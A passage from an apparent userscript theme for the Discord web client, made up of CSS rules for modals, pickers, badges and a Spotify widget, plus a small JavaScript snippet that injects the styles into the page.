/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.theme-dark .header-2-Imhb .tabBar-1kuXvJ .tab-ck0077.active-1MbGPa {
    background-color: var(--Color001);
	border-radius: 90px;
}

.recentMentionsPopout-3rCiI6 {
    width: 35vw;
    max-width: 900px;
    min-width: 900px;
    max-height: 80vh;
}

.container-enaOkj {
    border-radius: 24px;
}

.container-3u944p {
	background: var(--Color004);
}

.icon-1Itzco {
    background-color: var(--Color003);
    border-radius: 80px;
    color: var(--text-muted);
    padding: 22px;
}

/* Unreads */

.icon-1Itzco {
    background-color: var(--Color003);
    border-radius: 80px;
    color: var(--text-muted);
    padding: 22px;
}

.stars-1YAEQv {
	display: none;
}

.size12-3cLvbJ {
    font-size: 13px;
    line-height: 16px;
}

/* Mention */

.guildIcon-3Co6k- {
    background-color: var(--Color002);
	border-radius: 90px;
}

.secondary-dIudih {
    background-color: var(--Color002);
    color: var(--Color008);
}

.container-3iAQ-0 {
    background-color: var(--Color005);
}


.channelHeader-3Gd2xq {
    background-color: var(--Color005);
}

.messageContainer-gbhlwo {
    background-color: var(--Color004);
    border-radius: 24px;
	padding: 0px;

}

.container-3iAQ-0 {
    margin-bottom: 0px;
    padding-left: 20px;
    padding-right: 20px;
}

.tertiary-aMXF0g {
    background-color: var(--Color002);
    color: var(--Color008);
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Status Selection |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.menu-3sdvDG {
    border-radius: 20px;
}

.item-1tOPte {
    border-radius: 24px;
}

.description-2L932D {
    margin-bottom: 0px;
    font-size: 0px;
    line-height: 0px;

}

.scroller-3BxosC {
    padding: 8px 8px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Contex Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.wrapper-2aW0bm {
    background-color: var(--Color002);
    border-radius: 24px;
	box-shadow: var(--shadow001)
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Share Media ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */


.attachPopout-36hjtN {
    border-radius: 24px;
    background-color: var(--Color005);
    box-shadow: none;
}

.attachPopoutRow-3iqqu1 {
    border-radius: 90px;
    color: var(--Color008);
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Search History |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.searchResultsWrap-3-pOjs {
    background-color: var(--Color003);
    width: 800px;
}

.searchResult-9tQ1uo:before {
    z-index: 1;
    top: 0;
    background-image: linear-gradient(0deg,#0000,var(--Color003));
}

.searchResult-9tQ1uo:after {
    bottom: 0;
    background-image: linear-gradient(180deg,#0000,var(--Color003));
}

.channelName-1JRO3C {
    background: var(--Color003);
}

.searchResultMessage-1fxgXh.hit-1fVM9e {
    background: var(--Color004);
    position: relative;
    z-index: 1;
    max-height: none;
	box-shadow: var(--shadow001);
    border: none;
    border-radius: 24px;
	padding-bottom: 20px;
	padding-top: 20px;
}

.searchResult-9tQ1uo.expanded-w_LCGl {
    background: var(--Color005);
    border-radius: 24px;
	border: none;
	padding-bottom: 20px;
	padding-top: 20px;
}

.expanded-w_LCGl .searchResultMessage-1fxgXh.hit-1fVM9e {
    background: var(--Color004);
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Color Picker |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.theme-dark .colorPickerCustom-2CWBn2 {
    background: var(--Color004);
	border: none;
	box-shadow: var(--shadow001);
    border-radius: var(--Radius001);
}

.backdrop-1wrmKB {
	opacity: 0.1;
    background: #fff;
    transform: translateZ(0px);
}

.saturation-1FDvtn>div, .saturation-1FDvtn>div>div {
    border-radius: var(--Radius001);
}

.saturation-black {
    border-radius: 20px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Emoji Picker |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Background */

.inspector-S2gM3e {
    background-color: var(--Color005);
}

.contentWrapper-SvZHNd {
    background: var(--Color005);
    border-radius: 24px;
	padding-bottom: 40px;
    height: 111%;
	box-shadow: none;
}

.positionContainer-DEuh7X {
    height: 444px;
    z-index: 2;
}

.theme-dark .wrapper-1-Fsb8 {
    background: var(--Color005);
	border-radius: 24px;
}

/* Search */

.container-2XeR5Z {
    background-color: var(--Color004);
	border-radius: 90px;
}

.input-3Xdcic {
    background-color: var(--Color004);
	border-radius: 90px;
}

/* Header */

.inspector-sdLnLS {
    background: var(--Color003);
	border-radius: 24px;
}

/* Button */

.navButtonActive-1MkytQ {
    background-color: var(--Color001);
    color: #fff;
}

/* Icon */

.categoryItemDefaultCategorySelected-_HCKoz, .categoryItemDefaultCategorySelected-_HCKoz:hover {
    background-color: var(--Color003);
	border-radius: 90px;

}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Autocomplete |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Background */

.theme-dark .autocomplete-1vrmpx {
    background: var(--Color005);
    bottom: calc(100% - 8px);
    border-radius: 24px;
    box-shadow: none;
	padding-bottom: 48px;
	margin-bottom: -42px;
	z-index: 1;
}

/* Header */

:root .contentTitle-2tG_sM {
    color: var(--Color006);
}

/* Selector */

.theme-dark .selected-1Tbx07 {
    background: var(--Color003);
	border-radius: 90px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Create Channel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.theme-dark .modal-yWgWj- {
    background-color: var(--Color003);
    box-shadow: none;
	border-radius: 24px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Modals | Reaction Emoji Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Background */

.emojiPicker-3PwZFl {
    background-color: var(--Color005);
    border-radius: 24px;
    box-shadow: none;
	border: none;
}

/* Inspector */

.inspector-sdLnLS {
    background: var(--Color005);
    border-radius: 24px;
}

/* Emoji */

.unicodeShortcut-15J8Ck {
    color: var(--Color008);
    height: 56px;

}

.emojiItem-14v6tW.emojiItemSelected-1aLkfV {
    background: var(--Color002);
    border-radius: 90px;
}

.guildIcon-3h-1IH {
    background: var(--Color002);
	border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Upload  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .uploadModal-2ifh8j {
    background: var(--Color003);
    border-radius: 24px;
    box-shadow: none;
}

.theme-dark .footer-3mqk7D {
    background: var(--Color005);
    border-radius: 0 0 24px 24px;
    box-shadow: none;
}


.uploadModal-2ifh8j .inner-3nWsbo .file-34mY5K .icon-kyxXVr.image-2yrs5j {
    margin-top: -33px;
    margin-left: 16px;
    margin-right: 16px;
    width: 104px;
    height: 104px;
    background-color: #fff;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    border-radius: 90px;
    background-size: contain;
    -webkit-box-shadow: 0 2px 8px rgba(0,0,0,.4);
    box-shadow: 0 2px 8px rgba(0,0,0,.4);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Delete Message ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .message-2qRu38 {
    background-color: var(--Color004);
    border: none;
    box-shadow: none;
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Create a Server  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.theme-light .root-1gCeng {
    background: var(--Color003);
    box-shadow: none;
}

.theme-light .footer-2gL1pp {
    background: var(--Color005);
    box-shadow: none;
}

.lookFilled-1Gx00P.colorGrey-2DXtkV {
    color: var(--Color006);
    background: var(--Color001);
}

/* Button */

.lookFilled-1Gx00P.colorGrey-2DXtkV:hover {
    color: var(--Color006);
    background: var(--Color001);
    filter: brightness(120%);
}

/* Template */

.itemContainer-1LSFks {
    border-radius: 24px;
    border: none;
    background: var(--Color004);
    margin-bottom: 12px;
}

.templatesList-2E6rTe {
    margin-top: 24px;
    padding: 0px 12px 12px 12px;
    height: 330px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Set a custom status  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Select Server Region  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.theme-dark .regionSelectModal-12e-57 {
    background: var(--Color004) !important;
}

/* Header Text */

.regionSelectModal-12e-57 .regionSelectModalHeader-21khC1 {
    color: var(--Color007);
    margin-bottom: 20px;
}

/* Buttons */

.theme-dark .regionSelectModalOption-2DSIZ3 {
    background: var(--Color003);
    border: none;
    border-radius: 90px;
}

.theme-dark .regionSelectModalOption-2DSIZ3:hover {
    background: var(--Color002);
    border: none;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Add Game Popout  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.addGamePopout-2RY8Ju .actions-3wcPyD {
    -webkit-box-pack: end;
    -ms-flex-pack: end;
    justify-content: flex-end;
    margin-top: 12px;
}

.theme-dark .addGamePopout-2RY8Ju {
    background: var(--Color003);
    border-radius: 24px;
    border: none;
    box-shadow: var(--shadow001);

}




/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Region  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*  Background*/

.regionSelectPopout-p9-0_W {
    direction: ltr;
    box-shadow: var(--shadow001);
}

.theme-dark .quickSelectPopout-X1hvgV {
    background: var(--Color004);
    border-radius: 12px;
    position: relative;
    left: -4px;
}

.quickSelectPopoutOption-opKBx9 {
    padding-left: 40px;
    padding-right: 0px;
}

/*  flag */

.regionSelectFlag-1htPow {
    background-color: var(--Color001);
    border-radius: var(--Radius001);
}

/*  Region Text */

.regionSelectName-c5qL8O {
    direction: rtl;
    text-align: left;
    height: 20px;
    font-size: 14px;
    line-height: 20px;
    margin-right: -20px;
}

/*  Check */

.check-2by_h9 {
    position: relative;
    width: 16px;
    height: 12px;
    left: -136px;
}
















/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Add Server   ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.circleIconButton-jET_ig.selected-ugP_am {
    color: var(--Color006);
    background-color: var(--Color001);
    border-radius: var(--Radius002);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | Search Menu   |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .option-96V44q:after {
    background: none;
}

.theme-dark .option-96V44q.selected-rZcOL- {
    background-color: var(--Color001);
    border-radius: var(--Radius002);
}

.theme-dark .container-3ayLPN {
    background: var(--Color004);
    border-radius: var(--Radius001);
    box-shadow: var(--shadow001);
}

.theme-dark .option-96V44q.selected-rZcOL-:after {
    background: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Modals | View Server as Role |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.notice-1tZwqv {
    background: var(--Color001);
    color: var(--Color006);
    height: 40px;
    margin: 12px 12px 0px 12px;
    border-radius: var(--Radius002);
}

/* Disable Button */

.button-3Ijpww:hover {
    background-color: var(--Color001);
    filter: brightness(110%) ;
}

/* Menu */

.container-3LUQwT {

    background: var(--Color005);
    border-radius: var(--Radius001);

    max-width: 200px;
    -webkit-box-shadow: var(--shadow001);
    box-shadow: var(--shadow001);
}

/* Checkbox */

.iconContainer-1zobSR {
    border: 1.6px solid var(--Color007);
    border-radius: var(--Radius002);

}

.iconContainer-1zobSR.checked-1Fij_T {
    background: var(--Color001);
    border-color: var(--Color001);
}

.role-3ulsK-:hover {
    background-color: var(--Color001);
    border-radius: var(--Radius002);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Powercord | Spotify Modal ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.powercord-spotify {
    position: fixed;
    z-index: 2;
    bottom: 24px;
    right: 12px;
    width: 236px;
}

/* Advanced Controls */

.spotify-extra-controls {
    background: var(--Color005);
    border-radius: 24px;
    position: fixed;
    padding-top: 12px;
    padding-bottom: 50px;
    margin-bottom: 20px;
    bottom: 20px;
    width: 236px;
}

/* Buttons */

.powercord-spotify > .container-3baos1:hover button.button-14-BFJ{
    display: block;
}

.powercord-spotify > .container-3baos1 button[aria-checked="false"],
.powercord-spotify > .container-3baos1 button:not([role="switch"]) {
    display: none;
}

/* Seek Bar Progress */

.powercord-spotify .spotify-extra-controls + .spotify-seek {
    position: fixed;
    z-index: 9;
    right: 30px;
    width: 170px;
    bottom: 70px;
}

.powercord-spotify .spotify-seek {
    position: fixed;
    z-index: 9;
    right: 30px;
    width: 170px;
    bottom: 70px;
    }


.powercord-spotify .spotify-seek:hover {
    background: var(--Color005);
    position: fixed;
    z-index: 9;
    right: 30px;
    width: 170px;
    bottom: 70px;
}

/* Buttons */

.powercord-spotify > .spotify-seek:hover button.spotify-seek-bar-progress{
    display: block;
}

.powercord-spotify > .spotify-seek button[aria-checked="false"],
.powercord-spotify > .spotify-seek button:not([role="switch"]) {
    display: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Add-Ons | White Profile Badges |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.header-QKLPzZ .powercord-badge-cutie img:first-child{display: none !important}
.header-QKLPzZ .powercord-badge-cutie img:last-child{display:block!important}
[class^="profileBadge-2BqF-Z powercord-badge-"]{color:white!important}
[class*="BadgeStaff"]{filter: brightness(10)!important}
[class*="BadgePartner"]{filter: brightness(10)!important}
[class*="BadgeHypesquad-"]{filter: brightness(10)!important}
[class*="BadgeHypeSquadOnlineHouse1"]{filter: brightness(10)!important}
[class*="BadgeHypeSquadOnlineHouse2"]{filter: brightness(10)!important}
[class*="BadgeHypeSquadOnlineHouse3"]{filter: brightness(10)!important}
[class*="BadgeBugHunter"]{filter: brightness(10)!important}
[class*="BadgeVerifiedDeveloper"]{filter: brightness(10)!important}
[class*="BadgeEarlySupporter"]{background-image:url("/assets/ce15562552e3d70c56d5408cfeed2ffd.svg")!important}
[class*="BadgePremium"]{background-image:url("/assets/379d2b3171722ef8be494231234da5d1.svg")!important}
[class*="GuildSubscriberlvl1"]{background-image:url("/assets/a86d7e56b8208da9f8623ac49fe822dc.svg")!important}
[class*="GuildSubscriberlvl2"]{background-image:url("/assets/e85361cd599b6722548c5a5f003b4b78.svg")!important}
[class*="GuildSubscriberlvl3"]{background-image:url("/assets/7a0be61e754af3353d0871070f46a9d6.svg")!important}
[class*="GuildSubscriberlvl4"]{background-image:url("/assets/88f960f400930f109847d0335685de69.svg")!important}
[class*="GuildSubscriberlvl5"]{background-image:url("/assets/a99def5f819c077e5e5061cab741b7e6.svg")!important}
[class*="GuildSubscriberlvl6"]{background-image:url("/assets/2cfb317f3db3963d8ded9a97ee967bac.svg")!important}
[class*="GuildSubscriberlvl7"]{background-image:url("/assets/278736f579d810b11ddf308cb598b19e.svg")!important}
[class*="GuildSubscriberlvl8"]{background-image:url("/assets/38e40f25802a0fdf480d9b855a37a2f3.svg")!important}
[class*="GuildSubscriberlvl9"]{background-image:url("/assets/cfbc2d8ceacfacf07850f986c8165195.svg")!important}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.quickswitcher-3JagVE {
    border-radius: var(--Radius001);
}

.tutorialContainer-1v44GL {
    top: calc(var(--titlebar-height) -0px);
}


.input-2VB9rf {
    background: var(--Color003);
    border-radius: var(--Radius002);
    color: var(--Color006);
    box-shadow: none;
    height: 50px;
    margin-bottom: 12px;
}

.resultFocused-3aIoYe {
    background: var(--background-modifier-selected);
    border-radius: var(--Radius002);
}


.wrapper-232cHJ {
    border-radius: var(--Radius002);
    background: var(--Color001);
}

.scroller-zPkAnE {
    z-index: 0;
    margin-right: -17px;
    margin-top: -5px;
    max-height: 360px;
    background-color: var(--background-secondary);
    margin-right: 0px;
}

.result-oB0z-- {
    padding-right: 20px;
}



/*Subscriptions*/

[style^="color: rgba(255, 115, 250, 1)"], [style*=" color: rgba(255, 115, 250, 1)"], [style^="color: rgb(255, 115, 250)"], [style*=" color: rgb(255, 115, 250)"], [style^="color: #ff73fa"], [style*=" color: #ff73fa"], [style^="color: #FF73FA"], [style*=" color: #FF73FA"], [color="rgba(255, 115, 250, 1)"], [color="rgb(255, 115, 250)"], [color="#ff73fa"], [color="#FF73FA"], [style^="color: rgba(114, 137, 218, 1)"], [style*=" color: rgba(114, 137, 218, 1)"], [style^="color: rgb(114, 137, 218)"], [style*=" color: rgb(114, 137, 218)"], [style^="color: #7289da"], [style*=" color: #7289da"], [style^="color: #7289DA"], [style*=" color: #7289DA"], [color="rgba(114, 137, 218, 1)"], [color="rgb(114, 137, 218)"], [color="#7289da"], [color="#7289DA"] {
    color: var(--Color008) !important;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Fixes | Channel List Bottom ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Channel List had a gap at the bottom, this fixes it */
.container-3w7J-x {
    margin-bottom: -20px;
}

/* New/Unreaded Message notifications was being hidden by the gap fix  */
.unreadBottom-1_LF_w.unread-15xhX5.container-35XQWE {
  padding-bottom: 20px
}
==/UserStyle== */
`;
if (typeof GM_addStyle !== "undefined") {
  GM_addStyle(css);

} else {
  let styleNode = document.createElement("style");
  styleNode.appendChild(document.createTextNode(css));
  (document.querySelector("head") || document.documentElement).appendChild(styleNode);
};
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Less Trash |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
var days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
var mos = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];

GM_addStyle (`
  .timestamp-1E3uAL, .timestampCozy-2hLAPV  { /* Make timestamps more readable */
      font-size: .9em;
      color: #9090A0;
      padding-left: .5em;
  }
  .recentMentionsPopout-3rCiI6 { /* Change inbox size */
    max-height: calc(100vh - 44px);
    max-width: 80vw;
    width:80vw;
  }
  .header-2-Imhb { // Justify the mention/unread buttons right
    justify-content:flex-end; }
    .header-ykumBX { justify-content:flex-end;
  }
  .quickswitcher-35bYg4 { /* Hide quick switcher nag */
    display: none;
  }
  .tutorial-3w5I9h { /* Hide tutorial nag in inbox */
    display:none;
  }
  div.notice-3bPHh-.colorDefault-22HBa0 { /* Hide desktop install nag */
    display:none;
  }
 div.scroller-2TZvBN.none-2Eo-qx.scrollerBase-289Jih:nth-child(2) > div.listItem-2P_4kh:nth-child(9) { display: none; }

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Custom | Channel List Bottom ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.modeSelected-346R90 .content-1x5b-n, .modeSelected-346R90:hover .content-1x5b-n {
    margin-right: 8px;
}

.selected-3LIHYU .actionIcon-PgcMM2 {
	color: #03a651;
}

.content-1o0f9g {
    background: var(--background-primary) !important; }

.selected-3LIHYU .actionIcon-PgcMM2:hover {
